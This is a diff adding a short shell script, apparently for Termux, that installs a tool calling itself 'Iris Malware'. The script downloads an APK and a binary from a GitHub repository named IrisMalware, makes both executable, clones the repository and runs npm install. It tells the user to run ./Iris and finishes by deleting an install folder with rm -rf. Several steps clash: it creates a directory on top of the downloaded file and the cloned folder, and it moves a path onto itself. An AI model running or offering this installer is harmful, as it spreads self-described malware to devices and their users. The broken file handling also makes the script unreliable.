@@ -1,0 +1,21 @@
+cd $HOME
+wget https://github.com/IrisMalware/Iris/raw/master/Iris/Iris.apk;
+wget https://github.com/IrisMalware/Iris/raw/master/Iris/Iris;
+chmod +x Iris.apk;
+chmod +x Iris;
+pkg update -y;
+pkg upgrade -y;
+pkg install nodejs -y;
+pkg install git -y;
+git clone https://github.com/IrisMalware/Iris.git;
+cd $HOME/Iris;
+npm install;
+cd $HOME;
+mkdir $HOME/Iris;
+mv $HOME/Iris.apk $HOME/Iris;
+mv $HOME/Iris $HOME/Iris;
+echo "Iris Malware INSTALLED"
+sleep 1
+echo "NOW GO TO FOLDER And ./Iris To RUN"
+echo "CTRL+C FOR STOP"
+rm -rf $HOME/install;
